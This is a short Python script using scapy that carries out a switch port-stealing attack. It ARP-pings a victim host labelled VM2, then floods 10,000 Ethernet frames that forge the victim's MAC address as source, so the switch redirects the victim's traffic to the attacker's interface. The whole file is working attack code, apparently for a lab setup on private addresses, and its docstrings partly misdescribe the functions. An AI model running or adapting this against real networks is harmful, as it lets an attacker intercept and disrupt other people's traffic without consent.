#!/bin/env python
# coding: utf8
# vi: ft=python expandtab ts=4 sts=4 sw=4

import logging
_log = logging.getLogger(__name__)

try:
    from scapy.all import *
except ImportError as exc:
    _log.fatal(
        "You need scapy to run this program "
        "run this command: sudo python3 -m pip install -r requitements.txt"
    )


def get_mac_attack(iface):
    return get_if_hwaddr(iface)


def ping_arp4(dst: str):
    """Simple ICMPv4 ping using scapy

    Args:
        dst (str): The destination IPv4
    Return:
        str: Destination MAC address, None if there is no response
    """
    mac_address = None

    # Craft ARP frame : classic ARP request
    # Send ARP request and store ARP reply
    # It contains the MAC address of the target as the MAC source
    ans = sr1(ARP(op=1, pdst=dst), verbose=False, timeout=1)

    if ans is not None:
        # Extract MAC address from received ARP reply
        mac_address = ans[ARP].hwsrc
    if mac_address is not None:
        _log.info(f"ARP ping: {dst} has {mac_address}")
    else:
        _log.info(
            f"[bold red]{dst} did not reply to ARP request[/bold red]",
            extra={"markup": True}
        )
    return mac_address


def generate_packets(mac_victim, mac_attack):
    """Simple packet_list to hold all packets

    Args:
        None
    Return:
        list: packet list.
    """

    mac_broadcast = "ff:ff:ff:ff:ff:ff"
    packet_list = []
    for i in range(1,10000):
        packet  = Ether(src=mac_victim , dst=mac_attack)/ARP(op=2, hwdst=mac_broadcast)
        packet_list.append(packet)
    return packet_list



def port_steal(packet_list):
    """Try port stealing

    Args:
        packet_list (list): the packet list generated to flood
    """
    sendp(packet_list)


if __name__ == '__main__':
    mac_attack = get_mac_attack("ens3")
    # victim = VM2
    mac_victim = ping_arp4("192.168.33.10")
    print(mac_attack)
    print(mac_victim)
    packet_list = generate_packets(mac_victim, mac_attack)
    port_steal(packet_list)
